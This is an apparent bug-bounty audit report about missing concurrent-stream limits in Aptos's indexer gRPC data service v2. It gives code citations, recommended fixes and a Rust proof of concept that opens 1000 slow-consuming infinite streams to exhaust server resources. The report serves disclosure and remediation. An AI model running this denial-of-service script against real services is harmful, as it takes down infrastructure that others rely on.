# Audit Report

## Title
Unbounded Concurrent Stream Spawning Allows Resource Exhaustion Attack in Indexer gRPC Data Service V2

## Summary
The indexer-grpc-data-service-v2 lacks limits on concurrent stream creation, allowing an attacker to exhaust server resources (memory, file descriptors, CPU) by opening many concurrent `get_transactions` streams without rate limiting.

## Finding Description

The indexer-grpc-data-service-v2 service exposes a public gRPC endpoint that allows clients to stream blockchain transactions. When a client calls `get_transactions`, the service creates a response channel and spawns an async task to handle the stream. [1](#0-0) 

The request is passed through a bounded channel (`handler_tx`) with capacity 10, [2](#0-1)  but this only limits *queued* requests waiting to be processed, not the total number of active streams.

Once received from the handler channel, both `LiveDataService` and `HistoricalDataService` immediately spawn a new async task for each request using `scope.spawn()` [3](#0-2) [4](#0-3) 

**Critical Issue:** There is no limit on the number of spawned tasks. Each spawned task:
1. Registers a stream in the `ConnectionManager` [5](#0-4) 
2. Allocates a response channel with configurable size (default 5) [6](#0-5) 
3. Consumes memory for batch processing (up to 20MB per batch) [7](#0-6) 
4. For historical service, opens file handles and spawns additional tasks for file reading [8](#0-7) 

The gRPC server configuration uses HTTP2 keepalive but has no concurrent stream limits [9](#0-8)  and no rate limiting middleware is applied.

**Attack Scenario:**
1. Attacker opens multiple TCP connections to the gRPC service
2. On each connection, attacker sends many `get_transactions` requests
3. Each request passes through the handler queue (capacity 10) and spawns a task
4. Tasks accumulate without bound, consuming:
   - Memory for task stacks and channel buffers
   - DashMap entries for active stream tracking
   - File descriptors (especially for historical service)
   - CPU cycles for context switching
5. Server becomes unresponsive or crashes due to resource exhaustion

## Impact Explanation

This vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." 

According to Aptos Bug Bounty severity criteria, this qualifies as **Medium Severity** because it causes:
- API service degradation or crashes
- Potential validator node slowdowns if the indexer service is co-located with validator infrastructure
- State inconsistencies requiring manual intervention to restart the service

While this doesn't directly affect consensus or funds, it impacts the availability of critical indexing infrastructure that applications depend on for reading blockchain data.

## Likelihood Explanation

**Likelihood: High**

The attack is trivially exploitable:
- No authentication or authorization required on the gRPC endpoint
- Standard gRPC clients can be used to open streams
- No rate limiting or CAPTCHA mechanisms in place
- Low technical skill required (simple script can generate many requests)
- Attack can be launched from multiple source IPs to bypass network-level limits

The only limiting factors are:
- Network bandwidth of the attacker
- OS-level connection limits (typically thousands)
- The handler queue capacity (10) only delays spawning, doesn't prevent it

## Recommendation

Implement multiple layers of protection:

**1. Add concurrency limits at the tonic Server level:**
```rust
// In config.rs, modify the server builder:
server_builder
    .concurrency_limit_per_connection(100)  // Limit streams per connection
    .add_service(wrapper_service)
    // ... rest of the configuration
```

**2. Track and limit total concurrent streams globally:**
```rust
// In ConnectionManager:
pub(crate) struct ConnectionManager {
    // ... existing fields ...
    max_concurrent_streams: usize,
    current_stream_count: AtomicUsize,
}

pub(crate) fn insert_active_stream(
    &self,
    id: &str,
    start_version: u64,
    end_version: Option<u64>,
) -> Result<(), Status> {
    let current = self.current_stream_count.fetch_add(1, Ordering::SeqCst);
    if current >= self.max_concurrent_streams {
        self.current_stream_count.fetch_sub(1, Ordering::SeqCst);
        return Err(Status::resource_exhausted("Too many concurrent streams"));
    }
    // ... rest of the insertion logic
}
```

**3. Add rate limiting middleware using aptos-rate-limiter:**
```rust
// Use the existing aptos-rate-limiter crate to add per-IP rate limiting
use aptos_rate_limiter::RateLimiter;

// In DataServiceWrapper, check rate limits before spawning:
let client_ip = req.remote_addr();
if !rate_limiter.check(client_ip) {
    return Err(Status::resource_exhausted("Rate limit exceeded"));
}
```

**4. Add configuration options:**
```rust
// In IndexerGrpcDataServiceConfig:
#[serde(default = "IndexerGrpcDataServiceConfig::default_max_concurrent_streams")]
pub max_concurrent_streams: usize,

const fn default_max_concurrent_streams() -> usize {
    1000  // Reasonable default
}
```

## Proof of Concept

```rust
// PoC: Rust client that spawns many concurrent streams
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest,
};
use futures::StreamExt;
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://[INDEXER_SERVICE_ADDRESS]:50051";
    
    // Spawn 1000 concurrent streams
    let mut handles = vec![];
    for i in 0..1000 {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let mut client = DataServiceClient::connect(target).await?;
            let request = Request::new(GetTransactionsRequest {
                starting_version: Some(i * 1000),
                transactions_count: None,  // Infinite stream
                batch_size: Some(100),
                transaction_filter: None,
            });
            
            let mut stream = client.get_transactions(request).await?.into_inner();
            
            // Keep stream alive and consume data slowly
            while let Some(_response) = stream.next().await {
                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
            }
            Ok::<(), Box<dyn std::error::Error + Send + Sync>>(())
        });
        handles.push(handle);
    }
    
    // Wait for all streams (they will run until server crashes)
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Result:** The indexer service will experience memory exhaustion, high CPU usage from context switching, and eventually become unresponsive or crash with OOM errors.

**Notes**

The vulnerability exists because the service prioritizes throughput and flexibility over resource protection. The HTTP2 keepalive settings only clean up dead connections after 60+ seconds [10](#0-9)  which is insufficient to prevent rapid stream accumulation during an attack. The tracking of active streams through `NUM_CONNECTED_STREAMS` metrics [11](#0-10)  is only for monitoring, not enforcement.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/service.rs (L138-149)
```rust
    async fn get_transactions(
        &self,
        req: Request<GetTransactionsRequest>,
    ) -> Result<Response<Self::GetTransactionsStream>, Status> {
        let (tx, rx) = channel(self.data_service_response_channel_size);
        self.handler_tx.send((req, tx)).await.unwrap();

        let output_stream = ReceiverStream::new(rx);
        let response = Response::new(Box::pin(output_stream) as Self::GetTransactionsStream);

        Ok(response)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L33-37)
```rust
// HTTP2 ping interval and timeout.
// This can help server to garbage collect dead connections.
// tonic server: https://docs.rs/tonic/latest/tonic/transport/server/struct.Server.html#method.http2_keepalive_interval
const HTTP2_PING_INTERVAL_DURATION: std::time::Duration = std::time::Duration::from_secs(60);
const HTTP2_PING_TIMEOUT_DURATION: std::time::Duration = std::time::Duration::from_secs(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L39-39)
```rust
const DEFAULT_MAX_RESPONSE_CHANNEL_SIZE: usize = 5;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L123-123)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L251-253)
```rust
        let mut server_builder = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L28-28)
```rust
const MAX_BYTES_PER_BATCH: usize = 20 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L112-124)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L163-180)
```rust
            // TODO(grao): Pick a better channel size here, and consider doing parallel fetching
            // inside the `get_transaction_batch` call based on the channel size.
            let (tx, mut rx) = channel(1);

            let file_store_reader = self.file_store_reader.clone();
            let filter = filter.clone();
            tokio::spawn(async move {
                file_store_reader
                    .get_transaction_batch(
                        next_version,
                        /*retries=*/ 3,
                        /*max_files=*/ None,
                        filter,
                        Some(ending_version),
                        tx,
                    )
                    .await;
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L190-215)
```rust
    pub(crate) fn insert_active_stream(
        &self,
        id: &str,
        start_version: u64,
        end_version: Option<u64>,
    ) {
        self.active_streams.insert(
            id.to_owned(),
            (
                ActiveStream {
                    id: id.to_owned(),
                    start_time: Some(timestamp_now_proto()),
                    start_version,
                    end_version,
                    progress: None,
                },
                StreamProgressSamples::new(),
            ),
        );
        let label = if self.is_live_data_service {
            ["live_data_service"]
        } else {
            ["historical_data_service"]
        };
        NUM_CONNECTED_STREAMS.with_label_values(&label).inc();
    }
```
